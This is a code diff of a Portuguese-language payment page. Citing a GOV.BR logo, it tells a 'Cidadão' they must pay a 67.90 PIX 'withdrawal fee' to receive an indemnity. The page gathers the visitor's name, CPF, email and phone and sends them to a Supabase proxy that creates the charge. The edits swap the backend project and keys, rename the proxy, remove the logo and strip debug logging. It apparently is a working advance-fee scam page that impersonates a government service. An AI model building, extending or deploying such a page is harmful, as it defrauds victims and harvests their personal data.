@@ -1,8 +1,6 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-
-
 <script type="text/javascript">
     (function(c,l,a,r,i,t,y){
         c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
@@ -10,7 +8,6 @@
         y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
     })(window, document, "clarity", "script", "w12198gane");
 </script>
-    
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pagamento - Taxa de Saque</title>
@@ -63,8 +60,6 @@
     </div>
 
     <div class="card">
-        <img src="images/logo.png" alt="GOV.BR" class="logo">
-        
         <div id="paySection">
             <h2>Atenção!</h2>
             <p class="subtitle"><strong id="nomeDisplay">Cidadão</strong>, você está a apenas 1 passo de receber a sua indenização.</p>
@@ -115,11 +110,11 @@
     </footer>
 
     <script>
-    const SUPABASE_URL = 'https://hedyhxchumzuzkdplkzl.supabase.co';
-    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhlZHloeGNodW16dXprZHBsa3psIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQzOTY1MjcsImV4cCI6MjA4OTk3MjUyN30.BIlb6CsHa-d8hgQxQCkEOkJ8g92hg_-vUkWRAEwOsTY';
+    const SUPABASE_URL = 'https://zepzivnjtyluvjtfhmdd.supabase.co';
+    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InplcHppdm5qdHlsdXZqdGZobWRkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQ2NjkwMDAsImV4cCI6MjA5MDI0NTAwMH0.a0gTIjJskHz01EDRo5A3_Kefzjy4qHt2SmTRac1ifCQ';
 
     const params = new URLSearchParams(window.location.search);
-    const userData = JSON.parse(sessionStorage.getItem('userData')) || {};
+    const userData = JSON.parse(sessionStorage.getItem('userData') || '{}');
 
     const nome = params.get('nome') || userData.NOME || 'Cidadão';
     const cpf = params.get('cpf') || userData.CPF || '';
@@ -133,11 +128,11 @@
     document.getElementById('nomeDisplay').textContent = nome.split(' ')[0];
 
     async function invokeFunction(body) {
-      const res = await fetch(`${SUPABASE_URL}/functions/v1/syncpayments-proxy`, {
+      const res = await fetch(SUPABASE_URL + '/functions/v1/quantumpay-proxy', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+          'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
           'apikey': SUPABASE_ANON_KEY,
         },
         body: JSON.stringify(body),
@@ -148,50 +143,42 @@
     }
 
     async function handlePay() {
-      const btn = document.getElementById('btnPay');
-      const errorBox = document.getElementById('errorBox');
+      var btn = document.getElementById('btnPay');
+      var errorBox = document.getElementById('errorBox');
       btn.disabled = true;
       btn.textContent = '⏳ Processando...';
       errorBox.classList.add('hidden');
 
       try {
-        console.log('[PIX] Autenticando...');
-        const authData = await invokeFunction({ action: 'auth' });
-        console.log('[PIX] Auth:', JSON.stringify(authData));
-
+        var authData = await invokeFunction({ action: 'auth' });
         if (authData.error) throw new Error('Auth falhou: ' + (authData.detail || authData.error));
 
-        const token = authData.access_token || authData.token || authData?.data?.access_token || authData?.data?.token;
-        if (!token) throw new Error('Token não encontrado: ' + JSON.stringify(authData).substring(0, 300));
+        var token = authData.access_token || authData.token || (authData.data && (authData.data.access_token || authData.data.token));
+        if (!token) throw new Error('Token não encontrado');
 
-        console.log('[PIX] ✅ Token obtido');
+        if (!cpf) throw new Error('CPF é obrigatório. Adicione ?cpf=XXXXXXXXXXX na URL.');
 
-        if (!cpf) throw new Error('CPF é obrigatório para gerar o PIX. Volte para a página anterior ou adicione na URL.');
-
-        console.log('[PIX] Gerando cobrança...');
-        const pixData = await invokeFunction({
+        var pixData = await invokeFunction({
           action: 'cash-in',
-          token,
+          token: token,
           amount: 67.90,
           name: nome,
           cpf: cpf.replace(/\D/g, ''),
-          email,
+          email: email,
           phone: phone.replace(/\D/g, ''),
         });
 
-        console.log('[PIX] Cash-in:', JSON.stringify(pixData));
-
         if (pixData.error) throw new Error('PIX falhou: ' + (pixData.detail || pixData.error));
 
-        const d = pixData.data || pixData;
-        const code = d.pix_code || d.paymentCode || d.qrcode || d.copia_cola || d.emv || d.brcode || null;
-        const img = d.qrCodeImage || d.qrcode_image || d.image_base64 || d.qr_code_image || null;
+        var d = pixData.data || pixData;
+        var code = d.pix_code || d.paymentCode || d.qrcode || d.copia_cola || d.emv || d.brcode || null;
+        var img = d.qrCodeImage || d.qrcode_image || d.image_base64 || d.qr_code_image || null;
 
         pixCode = code;
 
-        const qrImg = document.getElementById('qrImg');
+        var qrImg = document.getElementById('qrImg');
         if (img) {
-          qrImg.src = img.startsWith('data:') ? img : 'data:image/png;base64,' + img;
+          qrImg.src = img.indexOf('data:') === 0 ? img : 'data:image/png;base64,' + img;
         } else if (code) {
           qrImg.src = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(code);
         }
@@ -211,15 +198,12 @@
     }
 
     function startTimer() {
-        if (timerInterval) clearInterval(timerInterval);
-      timerInterval = setInterval(() => {
+      if (timerInterval) clearInterval(timerInterval);
+      timerInterval = setInterval(function() {
         timeLeft--;
-        if (timeLeft <= 0) {
-          clearInterval(timerInterval);
-          timeLeft = 0;
-        }
-        const m = Math.floor(timeLeft / 60);
-        const s = timeLeft % 60;
+        if (timeLeft <= 0) { clearInterval(timerInterval); timeLeft = 0; }
+        var m = Math.floor(timeLeft / 60);
+        var s = timeLeft % 60;
         document.getElementById('timerDisplay').textContent =
           (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
         document.getElementById('progressBar').style.width = (timeLeft / 600 * 100) + '%';
@@ -229,10 +213,12 @@
     function handleCopy() {
       if (!pixCode) return;
       navigator.clipboard.writeText(pixCode);
-      const btn = document.getElementById('btnCopy');
+      var btn = document.getElementById('btnCopy');
       btn.textContent = '✅ Copiado!';
-      setTimeout(() => { btn.textContent = '📋 Copiar Código PIX'; }, 2000);
+      setTimeout(function() { btn.textContent = '📋 Copiar Código PIX'; }, 2000);
     }
     </script>
 </body>
 </html>
+    
+   
